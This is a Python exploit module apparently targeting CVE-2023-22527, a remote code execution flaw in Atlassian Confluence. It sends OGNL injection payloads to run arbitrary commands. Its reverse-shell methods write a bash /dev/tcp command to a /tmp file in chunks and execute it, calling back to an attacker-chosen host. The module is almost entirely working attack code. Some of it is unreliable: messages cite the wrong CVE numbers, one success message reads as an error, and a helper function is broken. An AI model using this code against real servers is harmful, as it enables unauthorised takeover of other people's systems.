import requests
import requests.packages
import toolss.utils
import urllib3
from urllib.parse import urljoin, quote
import re
import toolss

class CVE_2023_22527:
    cmd = "echo QaxNB12138"
    # payload = 'label=\\u0027%2b#request\\u005b\\u0027.KEY_velocity.struts2.context\\u0027\\u005d.internalGet(\\u0027ognl\\u0027).findValue(#parameters.x,{})%2b\\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().getWriter().write((new freemarker.template.utility.Execute()).exec({"'+cmd+'"}))\r\n'
    payload = r"label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({'" + cmd + "'}))"
    path = "/template/aui/text-inline.vm"
    
    def __init__(self, target, proxy) :
        self.target = target
        self.proxy = proxy
        self.header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
            "Content-Type": "application/x-www-form-urlencoded",
            'Content-Length': str(len(self.payload))
        }
        self.verify = False
        self.timeout = 5

    def get_version(self):
        try:
            urllib3.disable_warnings()
            url = urljoin(self.target, "/login.action")
            res_v = requests.get(url=url, timeout= self.timeout, proxies=self.proxy)
            if res_v.status_code == 200:
                ver = re.findall("<span id='footer-build-information'>.*</span>", res_v.text)
                if len(ver) >= 1:
                    version = ver[0].split("'>")[1].split("</")[0]
                    return version
                else:
                    return self.target

        except requests.exceptions.RequestException as e:
            return f"[!] An error occurred: {str(e)}"    

    def check(self):
        try:
            urllib3.disable_warnings()
            url = urljoin(self.target, self.path)
            res = requests.post(url=url, headers=self.header, data=self.payload, verify=self.verify, timeout=self.timeout, proxies=self.proxy)
            if res.status_code == 200 and 'X-Cmd-Response' in res.headers:
                return f"[+] {self.target}存在CVE-2022-26134 RCE command:[echo QaxNB12138]\n[+] Command Result: {res.headers['X-Cmd-Response']}"
            else:
                return f"[-] {self.target}不存在confluence CVE-2023-26134 RCE"
        except requests.exceptions.RequestException as e:
            return f"[!] An error occurred: {str(e)}"

    def exploit(self, command):
        try:
            urllib3.disable_warnings()
            url = urljoin(self.target, self.path)
            exp = r"label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({'" + command + r"'}))"
            res = requests.post(url=url, headers=self.header, data=exp, verify=self.verify, timeout=self.timeout, proxies=self.proxy)
            if res.status_code == 200 and 'X-Cmd-Response' in res.headers:
                # print(res.headers.get("X-Cmd-Response"))
                return res.headers.get("X-Cmd-Response")
            else:
                return "Null"
        except requests.exceptions.RequestException as e:
            return f"[!] An error occurred: {str(e)}"


    def create_file(self, url, filename):
        try:
            write_file_data = "label=aaa\\u0027%2b#request.get(\\u0027.KEY_velocity.struts2.context\\u0027).internalGet("
            write_file_data += "\\u0027ognl\\u0027).findValue(#parameters.poc[0],"
            write_file_data += "{})%2b\\u0027&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader("
            write_file_data += f"'X-Cmd-Response',(new+java.io.PrintWriter(new+java.io.FileWriter('{filename}',false))).printf('','').checkError())"
            write_file_response = requests.post(url=url, headers=self.header, data=write_file_data, verify=self.verify, timeout=self.timeout, proxies=self.proxy)
            if write_file_response.status_code == 200:
                return f"[+] An error occurred: {filename}"
            else:
                return f"[-] Create File: {filename} Failed"
        except requests.exceptions.RequestException as e:
            return f"[!] 发生错误了:{str(e)}"
    
    def write_shell_toFile(self, url, filename, shell_str):
        try:
            urllib3.disable_warnings()
            shell_command_data = "label=aaa\\u0027%2b#request.get(\\u0027.KEY_velocity.struts2.context\\u0027).internalGet("
            shell_command_data += "\\u0027ognl\\u0027).findValue(#parameters.poc[0],"
            shell_command_data += "{})%2b\\u0027&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader("
            shell_command_data += f"'X-Cmd-Response',(new+java.io.PrintWriter(new+java.io.FileWriter('{filename}',true))).printf('{shell_str}','').checkError())"
            requests.post(url=url, headers=self.header, data=shell_command_data, verify=self.verify, timeout=self.timeout, proxies=self.proxy)
            return f"[+] Loop Write Reverse Shell To: {filename}"
        except requests.exceptions.RequestException as e:
            return f"[!] An error occurred: {str(e)}"


    def reverse(self, lhost, lport):
        result = list()
        try:
            urllib3.disable_warnings()
            url = urljoin(self.target, self.path)
            reverse_command = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
            file_name = "/tmp/" + toolss.utils.get_random_string(4)
            reverse_list = self.chunk_str(quote(reverse_command), size=31)
            file_result = self.create_file(url, file_name)
            result.append(file_result)
            for shell_str in reverse_list:
                write_shell_result = self.write_shell_toFile(url=url, filename=file_name, shell_str=shell_str)
                result.append(write_shell_result)
            reverse_data = "label=aaa\\u0027%2b#request.get(\\u0027.KEY_velocity.struts2.context\\u0027).internalGet("
            reverse_data += "\\u0027ognl\\u0027).findValue(#parameters.poc[0],"
            reverse_data += "{})%2b\\u0027&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader("
            reverse_data += "'X-Cmd-Response',(new+freemarker.template.utility.Execute()).exec({"
            reverse_data += f"'bash {file_name}'"
            reverse_data += "}))"

            requests.post(url=url, headers=self.header, data=reverse_data, verify=self.verify, timeout=self.timeout, proxies=self.proxy)
            result.append(f"[*] Reverse shell command executed. Check results on host {lhost}!")
        except requests.exceptions.ReadTimeout:
            result.append(f"[*] Reverse shell command executed. Check results on host {lhost}!")
        except requests.exceptions.RequestException as e:
             result.append(f"[!] An error occurred: {str(e)}")

        return result

    def reverses(self, lhost, lport):
        try:
            urllib3.disable_warnings()
            url = urljoin(self.target, self.path)
            rev = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
            filename = "/tmp/" + toolss.utils.get_random_string(4)
            chunk = self.chunk_str(quote(rev), 31)
            # 创建文件
            write_file_data = "label=aaa\\u0027%2b#request.get(\\u0027.KEY_velocity.struts2.context\\u0027).internalGet("
            write_file_data += "\\u0027ognl\\u0027).findValue(#parameters.poc[0],"
            write_file_data += "{})%2b\\u0027&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader("
            write_file_data += f"'X-Cmd-Response',(new+java.io.PrintWriter(new+java.io.FileWriter('{filename}',false))).printf('','').checkError())"
            write_file_response = requests.post(url, headers=self.header, data=write_file_data, verify=self.verify, timeout=self.timeout)
            if write_file_response.status_code == 200:
                print(f"[+] Create File: {filename}")
            else:
                print(f"[-] Create File: {filename} Failed")
            
            # 向文件循环写入反弹命令
            for shell_str in chunk:
                shell_command_data = "label=aaa\\u0027%2b#request.get(\\u0027.KEY_velocity.struts2.context\\u0027).internalGet("
                shell_command_data += "\\u0027ognl\\u0027).findValue(#parameters.poc[0],"
                shell_command_data += "{})%2b\\u0027&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader("
                shell_command_data += f"'X-Cmd-Response',(new+java.io.PrintWriter(new+java.io.FileWriter('{filename}',true))).printf('{shell_str}','').checkError())"

                requests.post(url=url, headers=self.header, data=shell_command_data, verify=self.verify, timeout=self.timeout)
            
            # 执行反弹shell命令
            reverse_data = "label=aaa\\u0027%2b#request.get(\\u0027.KEY_velocity.struts2.context\\u0027).internalGet("
            reverse_data += "\\u0027ognl\\u0027).findValue(#parameters.poc[0],"
            reverse_data += "{})%2b\\u0027&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader("
            reverse_data += "'X-Cmd-Response',(new+freemarker.template.utility.Execute()).exec({"
            reverse_data += f"'bash {filename}'"
            reverse_data += "}))"

            res = requests.post(url=url, headers=self.header, data=reverse_data, verify=self.verify, timeout=self.timeout)
            print(res.status_code)
            return f"[*] 反弹shell命令已执行，请返回主机{lhost}查看结果!"
        except requests.exceptions.RequestException as e:
            pass



    def chunk_str(self, strs, size=3):
        if isinstance(strs, str):
            # 使用列表推导式将字符串按照指定大小分割成块。
            chunks = [strs[i:i+size] for i in range(0, len(strs), size)]
            # chunks = []
            # for i in range(0, length, size):
            #     chunk = s[i:i + size]
            #     chunks.append(chunk)
            for i in range(len(chunks)):
                if chunks[i][-1] == "%" and i < len(chunks) - 1:
                    chunks[i] += strs[len[strs] - 1 : len(strs) + 1] # 如果一个块的最后一个字符是'%'且不是最后一个块，函数会将原始字符串的下一个字符附加到该块上
                elif chunks[i][-2] == "%" and i < len(chunks) - 1:
                    chunks[i] += strs[len[strs] - 1] # 如果一个块的倒数第二个字符是'%'且不是最后一个块，函数会将原始字符串的最后一个字符附加到该块上。
            
            return chunks
